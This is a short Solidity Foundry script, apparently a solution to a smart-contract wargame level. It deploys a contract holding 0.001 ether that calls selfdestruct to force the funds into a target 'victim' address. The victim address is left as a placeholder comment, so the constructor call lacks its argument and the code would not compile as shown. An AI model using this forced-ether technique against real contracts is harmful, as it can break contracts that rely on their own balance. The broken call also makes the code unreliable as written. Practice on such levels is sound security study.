//SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

import {Script} from "forge-std/Script.sol";

contract AttackScript is Script {
    Selfdestroying selfdestroying;

    function run() public {
        vm.startBroadcast();
        selfdestroying = new Selfdestroying{
            value: 0.001 ether
        } /* Your instance address */();
        selfdestroying.attack();
        vm.stopBroadcast();
    }
}

contract Selfdestroying {
    address victim;

    constructor(address _victim) payable {
        victim = _victim;
    }

    function attack() public {
        selfdestruct(payable(victim));
    }
}
